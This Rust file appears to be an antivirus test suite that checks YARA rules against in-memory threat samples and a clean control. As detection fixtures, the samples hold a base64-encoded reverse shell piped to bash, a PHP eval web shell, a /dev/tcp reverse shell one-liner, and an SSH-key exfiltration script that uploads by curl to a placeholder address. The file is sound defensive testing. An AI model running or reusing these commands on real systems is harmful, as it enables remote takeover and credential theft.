//! Antivirus threat detection test suite and verification checklist.
//! Tests configured YARA detection against known virus, malware, and exploit patterns in-memory,
//! accompanied by a clean negative control to ensure zero false positives.
//! Safe for live environments: strictly read-only in-memory scans, never executes or drops malicious binaries.

use std::path::Path;
use std::time::{Duration, Instant};

use ai_antivirus_common::config::Config;
use ai_antivirus_rules::scan::{Yara, EICAR};
use serde::{Deserialize, Serialize};
use serde_json::json;

/// One test case in the antivirus test suite.
struct ThreatTestCase {
    name: &'static str,
    category: &'static str,
    sample: Vec<u8>,
    expected_rule: Option<&'static str>,
}

/// Result of evaluating one test case.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ThreatCheckResult {
    pub name: String,
    pub category: String,
    pub expected_rule: Option<String>,
    pub detected_rules: Vec<String>,
    pub passed: bool,
    pub duration_us: u128,
}

/// Run the antivirus test suite and output a detailed checklist.
pub fn run(config: &Path, json_output: bool) -> Result<bool, String> {
    let cfg = Config::load(config).map_err(|e| e.to_string())?;
    let yara = Yara::load_dir(
        &cfg.engine.rules_dir.join("yara"),
        Duration::from_millis(u64::from(cfg.engine.yara_timeout_ms)),
    )
    .map_err(|e| e.to_string())?;

    let elf = |tail: &[u8]| -> Vec<u8> {
        [b"\x7fELF\x02\x01\x01\0".as_slice(), tail].concat()
    };

    let cases = [
        ThreatTestCase {
            name: "EICAR Standard Antivirus Test",
            category: "Standard Test Sample",
            sample: EICAR.to_vec(),
            expected_rule: Some("eicar_test_file"),
        },
        ThreatTestCase {
            name: "Encoded Shell Dropper Script",
            category: "Obfuscated Payload",
            sample: b"#!/bin/sh\necho 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEgICAgICAgIA==' | base64 -d | bash\n".to_vec(),
            expected_rule: Some("encoded_payload_to_shell"),
        },
        ThreatTestCase {
            name: "PHP Web Shell RCE Backdoor",
            category: "Web Shell",
            sample: b"<?php @eval(base64_decode($_POST['cmd'])); ?>".to_vec(),
            expected_rule: Some("php_webshell_eval_input"),
        },
        ThreatTestCase {
            name: "Interactive Reverse Shell One-Liner",
            category: "Network Backdoor",
            sample: b"#!/bin/bash\nbash -i >& /dev/tcp/198.51.100.1/4444 0>&1\n".to_vec(),
            expected_rule: Some("reverse_shell_oneliner"),
        },
        ThreatTestCase {
            name: "SSH Key Exfiltration Script",
            category: "Credential Stealer",
            sample: b"#!/bin/sh\ntar czf /tmp/k.tgz ~/.ssh/id_rsa\ncurl -s -F f=@/tmp/k.tgz https://203.0.113.9/up\n".to_vec(),
            expected_rule: Some("ssh_key_stealer_script"),
        },
        ThreatTestCase {
            name: "XMRig Cryptominer Signature",
            category: "Unauthorized Mining",
            sample: b"stratum+tcp://pool.example.invalid:3333 xmrig randomx \"donate-level\"".to_vec(),
            expected_rule: Some("cryptominer_xmrig"),
        },
        ThreatTestCase {
            name: "Diamorphine LKM Rootkit Pattern",
            category: "Kernel Rootkit",
            sample: elf(b"..diamorphine_secret..hacked_kill.."),
            expected_rule: Some("linux_lkm_rootkit_known"),
        },
        ThreatTestCase {
            name: "LD_PRELOAD Rootkit Hook",
            category: "Library Hook / Rootkit",
            sample: elf(b"/etc/ld.so.preload\0dlsym\0readdir\0"),
            expected_rule: Some("ld_preload_rootkit_hint"),
        },
        ThreatTestCase {
            name: "Clean System Document (Negative Control)",
            category: "False-Positive Check",
            sample: b"Harmless standard documentation and plain text configuration.\n".to_vec(),
            expected_rule: None,
        },
    ];

    let mut results: Vec<ThreatCheckResult> = Vec::with_capacity(cases.len());
    let mut eicar_detected = false;
    let mut clean_passed = false;

    for case in &cases {
        let t0 = Instant::now();
        let matches = yara.scan_bytes(&case.sample).map_err(|e| e.to_string())?;
        let elapsed = t0.elapsed().as_micros();
        let detected_rules: Vec<String> = matches.into_iter().map(|m| m.rule).collect();

        let passed = match case.expected_rule {
            Some(rule) => detected_rules.iter().any(|r| r == rule),
            None => detected_rules.is_empty(),
        };

        if case.name == "EICAR Standard Antivirus Test" {
            eicar_detected = passed;
        }
        if case.expected_rule.is_none() {
            clean_passed = passed;
        }

        results.push(ThreatCheckResult {
            name: case.name.to_string(),
            category: case.category.to_string(),
            expected_rule: case.expected_rule.map(str::to_string),
            detected_rules,
            passed,
            duration_us: elapsed,
        });
    }

    let total = results.len();
    let passed_count = results.iter().filter(|r| r.passed).count();
    let all_ok = passed_count == total;
    let detection_rate_pct = if total > 1 {
        let threat_total = total - 1;
        let threat_detected = results
            .iter()
            .filter(|r| r.expected_rule.is_some() && r.passed)
            .count();
        (threat_detected as f64 / threat_total as f64) * 100.0
    } else {
        100.0
    };

    if json_output {
        println!(
            "{}",
            json!({
                "ok": all_ok,
                "eicar_detected": eicar_detected,
                "clean_control_passed": clean_passed,
                "total_tests": total,
                "passed_tests": passed_count,
                "detection_rate_pct": detection_rate_pct,
                "checklist": results,
                "scope": "configured in-memory YARA threat & virus test suite"
            })
        );
    } else {
        println!("AI Antivirus Threat & Virus Test Checklist");
        println!("==========================================================================================");
        println!(
            "{:<4} {:<38} {:<24} {:<16} {:>10}",
            "Chk", "Test Vector / Sample", "Category", "Status", "Latency"
        );
        println!("------------------------------------------------------------------------------------------");
        for r in &results {
            let mark = if r.passed { "[✔]" } else { "[✘]" };
            let status = if r.passed {
                if let Some(rule) = &r.expected_rule {
                    format!("DETECTED ({rule})")
                } else {
                    "CLEAN (0 FP)".to_string()
                }
            } else {
                "FAILED".to_string()
            };
            let latency = format!("{:.2} ms", (r.duration_us as f64) / 1000.0);
            println!(
                "{:<4} {:<38} {:<24} {:<16} {:>10}",
                mark, r.name, r.category, status, latency
            );
        }
        println!("==========================================================================================");
        println!(
            "Checklist Summary: {passed_count}/{total} tests passed ({detection_rate_pct:.1}% detection rate, clean control verified)"
        );
        println!(
            "Overall Verification: {}\n",
            if all_ok { "PASS (VERIFIED EFFECTIVE)" } else { "FAIL" }
        );
    }

    // Return true if failed (per CLI convention in main: if failed { exit(1) })
    Ok(!all_ok)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn threat_checklist_passes_against_shipped_yara_rules() {
        let rules_dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules");
        let dir = tempfile::tempdir().unwrap();
        let cfg_path = dir.path().join("ai-antivirus.toml");
        std::fs::write(
            &cfg_path,
            format!(
                "[engine]\nrules_dir = \"{}\"\nyara_timeout_ms = 5000\n",
                rules_dir.display()
            ),
        )
        .unwrap();

        let res = run(&cfg_path, false);
        assert_eq!(res, Ok(false));

        let res_json = run(&cfg_path, true);
        assert_eq!(res_json, Ok(false));
    }
}
